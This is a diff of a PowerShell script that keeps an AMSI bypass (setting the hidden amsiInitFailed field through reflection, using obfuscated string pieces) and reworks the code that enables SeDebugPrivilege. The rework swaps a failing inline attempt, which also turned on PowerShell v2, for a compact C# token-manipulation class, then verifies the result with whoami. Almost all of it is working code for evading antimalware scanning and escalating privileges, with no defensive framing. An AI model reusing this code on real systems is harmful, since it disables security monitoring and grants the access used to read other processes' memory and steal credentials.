@@ -3,36 +3,40 @@ $t = [Ref].Assembly.GetType("System.Management.Automation." + $b + $a + $c)
 $f = $t.GetField("amsiInitFailed", "NonPublic,Static")
 $f.SetValue($null, $true)
 
-# Method 1 - using PowerShell (most reliable)
-powershell -c "Enable-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2 -NoRestart; $priv = 'SeDebugPrivilege'; $type = Add-Type -MemberDefinition '[DllImport(\"advapi32.dll\")] public static extern bool AdjustTokenPrivileges(IntPtr TokenHandle, bool DisableAllPrivileges, ref TOKEN_PRIVILEGES NewState, int BufferLength, IntPtr PreviousState, IntPtr ReturnLength); [DllImport(\"advapi32.dll\")] public static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle); public struct TOKEN_PRIVILEGES { public int PrivilegeCount; public LUID Luid; public int Attributes; } public struct LUID { public uint LowPart; public int HighPart; }' -Name 'AdjPriv' -PassThru; Write-Host 'Trying to enable SeDebugPrivilege...'"
-
-$privilege = "SeDebugPrivilege"
-$type = Add-Type -MemberDefinition @"
+Add-Type @"
 using System;
 using System.Runtime.InteropServices;
-public class TokenAdjuster {
+public class TokenManipulator {
+    [DllImport("advapi32.dll", ExactSpelling = true, SetLastError = true)]
+    internal static extern bool AdjustTokenPrivileges(IntPtr htok, bool disall, ref TokPriv1Luid newst, int len, IntPtr prev, IntPtr rel);
+    [DllImport("kernel32.dll", ExactSpelling = true)]
+    internal static extern IntPtr GetCurrentProcess();
+    [DllImport("advapi32.dll", ExactSpelling = true, SetLastError = true)]
+    internal static extern bool OpenProcessToken(IntPtr h, int acc, ref IntPtr phtok);
     [DllImport("advapi32.dll", SetLastError = true)]
-    public static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);
-    [DllImport("advapi32.dll", SetLastError = true)]
-    public static extern bool LookupPrivilegeValue(string lpSystemName, string lpName, out long lpLuid);
-    [DllImport("advapi32.dll", SetLastError = true)]
-    public static extern bool AdjustTokenPrivileges(IntPtr TokenHandle, bool DisableAllPrivileges, ref TOKEN_PRIVILEGES NewState, int BufferLength, IntPtr PreviousState, IntPtr ReturnLength);
-    [StructLayout(LayoutKind.Sequential)]
-    public struct TOKEN_PRIVILEGES {
-        public int PrivilegeCount;
+    internal static extern bool LookupPrivilegeValue(string host, string name, ref long pluid);
+    [StructLayout(LayoutKind.Sequential, Pack = 1)]
+    internal struct TokPriv1Luid {
+        public int Count;
         public long Luid;
-        public int Attributes;
+        public int Attr;
+    }
+    internal const int SE_PRIVILEGE_ENABLED = 0x00000002;
+    internal const int TOKEN_QUERY = 0x00000008;
+    internal const int TOKEN_ADJUST_PRIVILEGES = 0x00000020;
+    public static bool AddPrivilege(string privilege) {
+        TokPriv1Luid tp;
+        IntPtr hproc = GetCurrentProcess();
+        IntPtr htok = IntPtr.Zero;
+        OpenProcessToken(hproc, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, ref htok);
+        tp.Count = 1;
+        tp.Luid = 0;
+        tp.Attr = SE_PRIVILEGE_ENABLED;
+        LookupPrivilegeValue(null, privilege, ref tp.Luid);
+        return AdjustTokenPrivileges(htok, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero);
     }
 }
-"@ -Name TokenAdjuster -PassThru
+"@
 
-$tp = New-Object TokenAdjuster+TOKEN_PRIVILEGES
-$tp.PrivilegeCount = 1
-$tp.Attributes = 2  # SE_PRIVILEGE_ENABLED
-[TokenAdjuster]::LookupPrivilegeValue($null, "SeDebugPrivilege", [ref]$tp.Luid)
-
-$token = [IntPtr]::Zero
-[TokenAdjuster]::OpenProcessToken([System.Diagnostics.Process]::GetCurrentProcess().Handle, 0x28, [ref]$token)
-[TokenAdjuster]::AdjustTokenPrivileges($token, $false, [ref]$tp, 0, [IntPtr]::Zero, [IntPtr]::Zero)
-
+[TokenManipulator]::AddPrivilege("SeDebugPrivilege")
 whoami /priv | findstr Debug
